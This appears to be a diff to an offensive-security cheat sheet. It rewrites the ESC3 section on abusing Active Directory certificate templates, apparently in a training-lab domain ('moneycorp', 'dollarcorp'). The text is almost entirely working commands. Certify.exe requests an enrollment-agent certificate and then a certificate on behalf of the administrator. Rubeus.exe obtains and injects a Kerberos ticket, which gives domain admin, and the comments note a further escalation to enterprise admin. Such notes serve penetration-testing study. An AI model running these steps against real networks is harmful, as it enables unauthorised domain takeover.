@@ -1393,23 +1393,22 @@ openssl pkcs12 -in esc6.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provid
 Rubeus.exe asktgt /user:administrator /certificate:esc6.pfx /password:SecretPass@123 /ptt
 
 ### ESC3 abuse
-# In the case we have a vulnerable template where the EKU contains "Certificate Request Agent", we can enroll it and it can be used for domain authentication
-# Export the finding
-Certify.exe find /json /outfile:C:\Tools\file.json
-
-# Verify if EKU contains property 1.3.6.1.5.5.7.3.2 (clientAuth) 
-((Get-Content C:\Tools\file.json |ConvertFrom-Json).CertificateTemplates | ?{$_.ExtendedKeyUsage -contains "1.3.6.1.5.5.7.3.2"}) | fl *
+# In the case we need to have
+# a vulnerable template where the EKU contains "Certificate Request Agent" and we can enroll it
+# a second template that has a setting in "issuance requirements" with a "certificate Request Agent" as application policy
+# This second template must have a "Client authentication" EKU
 
 # In this case we have to request two certificates.
-# The  first one is the certificate for the Request agent
+# Temaplte "SmartCardEnrollment-Agent" to create the request agent
+ 
 Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"SmartCardEnrollment-Agent"
-
 # Save the output anc convert to a pfx named (for example) esc3agent.pfx
-# Next use this pfx to request a cetificate on behalf of administrator (domain admin, not enteprise admin)
-Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"SmartCardEnrollment-Agent" /onbehalfof:dcorp\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123
 
-# Next save the output and convert to esc3age-DA.pfx
-Rubeus.exe asktgt /user:administrator /certificate:esc3agent-DA.pfx /password:SecretPass@123 /ptt
+# Next use this pfx to request a cetificate on behalf of administrator (domain admin, not enteprise admin)
+Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"SmartCardEnrollment-Users" /onbehalfof:dollarcorp\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123
+
+# Next save the output and convert to esc3.pfx
+Rubeus.exe asktgt /user:administrator /certificate:esc3.pfx /password:SecretPass@123 /ptt
 
 # Now we're domain admin in dcorp domain
 # WE can escalte to EA changing the onbehalof paramenter
